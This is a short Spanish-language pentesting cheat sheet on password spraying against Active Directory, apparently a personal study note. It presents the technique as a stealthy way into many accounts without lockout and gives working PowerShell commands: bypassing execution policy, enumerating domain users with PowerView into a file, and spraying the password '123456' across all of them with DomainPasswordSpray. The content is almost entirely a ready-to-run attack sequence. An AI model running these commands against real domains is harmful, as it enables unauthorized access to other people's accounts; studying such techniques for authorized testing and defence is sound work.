# Password Spraying 

Tags: #AD #Powershell #Windows #Enumeracion 

Técnica utilizada para adivinar simultáneamente las contraseñas de varias cuentas de usuario con un número reducido de intentos de contraseña. Su ventaja principal es proporcionar un método sigiloso para obtener acceso a varias cuentas de usuario sin activar el bloqueo de cuentas. 

```bash
❯ powershell -ep bypass                   # Politica que nos permite ejecutar scripts en Powershell
 	# ep = Ejecutar politicas 


# Enumeracion de usuarios 
❯ . .\PowerView.ps1                       # Importar el modulo PS1
❯ Get-DomainUser | select-Object -ExpandProperty cn | Out-File user.txt        # Enumeracion de usuarios y el resultado lo guardamos en un archivo llamado user.txt


❯ . .\DomainPasswordSpray.ps1             # Importar el modulo para 'Password Spraying' 
❯ Invoke-DomainPasswordSpray -UserList .\user.txt -Password 123456 -Verbose 
	# Password = Hacemos que la pasword '123456' la pruebe en todos los usuarios de la lista 'user.txt'
	# UserList = Lista de usuarios
```